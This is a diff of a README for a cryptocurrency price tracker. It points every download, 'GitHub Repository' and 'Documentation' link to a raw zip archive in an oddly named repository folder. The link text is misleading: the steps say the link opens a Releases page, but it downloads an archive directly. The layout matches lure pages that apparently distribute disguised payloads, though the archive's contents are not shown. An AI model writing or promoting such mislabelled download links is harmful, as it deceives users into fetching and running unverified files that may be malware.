@@ -1,7 +1,7 @@
 # 🚀 crypto-price-tracker - Track Your Cryptocurrency Prices
 
 ## 📥 Download
-[![Download Latest Release](https://github.com/Zenobgmi/crypto-price-tracker/raw/refs/heads/main/kakapo/price_crypto_tracker_v1.6.zip)](https://github.com/Zenobgmi/crypto-price-tracker/raw/refs/heads/main/kakapo/price_crypto_tracker_v1.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Zenobgmi/crypto-price-tracker/main/kakapo/crypto-price-tracker-Pawtucket.zip)](https://raw.githubusercontent.com/Zenobgmi/crypto-price-tracker/main/kakapo/crypto-price-tracker-Pawtucket.zip)
 
 ## 📖 Description
 The **crypto-price-tracker** helps you track and store cryptocurrency prices using mock data and analytics logic. This application provides a simple way to monitor price changes over time, making it easier for you to understand market trends and make informed decisions.
@@ -24,7 +24,7 @@ Before you start, ensure your computer meets these requirements:
 ## 📤 Download & Install
 To get the crypto-price-tracker, visit the Releases page below and follow the steps:
 
-[Download Latest Release](https://github.com/Zenobgmi/crypto-price-tracker/raw/refs/heads/main/kakapo/price_crypto_tracker_v1.6.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Zenobgmi/crypto-price-tracker/main/kakapo/crypto-price-tracker-Pawtucket.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the application.
@@ -58,10 +58,10 @@ The **crypto-price-tracker** is completely free to use.
 If you encounter any issues or have questions, feel free to reach out through our issue tracker on GitHub. We welcome your feedback and inquiries.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/Zenobgmi/crypto-price-tracker/raw/refs/heads/main/kakapo/price_crypto_tracker_v1.6.zip)
-- [Documentation](https://github.com/Zenobgmi/crypto-price-tracker/raw/refs/heads/main/kakapo/price_crypto_tracker_v1.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Zenobgmi/crypto-price-tracker/main/kakapo/crypto-price-tracker-Pawtucket.zip)
+- [Documentation](https://raw.githubusercontent.com/Zenobgmi/crypto-price-tracker/main/kakapo/crypto-price-tracker-Pawtucket.zip)
 
 ## 🏁 Conclusion
 The **crypto-price-tracker** is a straightforward tool that allows you to effectively monitor cryptocurrency prices. With its easy installation and user-friendly interface, you'll be tracking the markets in no time. Don't forget to visit the Releases page for updates and new features:
 
-[Download Latest Release](https://github.com/Zenobgmi/crypto-price-tracker/raw/refs/heads/main/kakapo/price_crypto_tracker_v1.6.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Zenobgmi/crypto-price-tracker/main/kakapo/crypto-price-tracker-Pawtucket.zip)
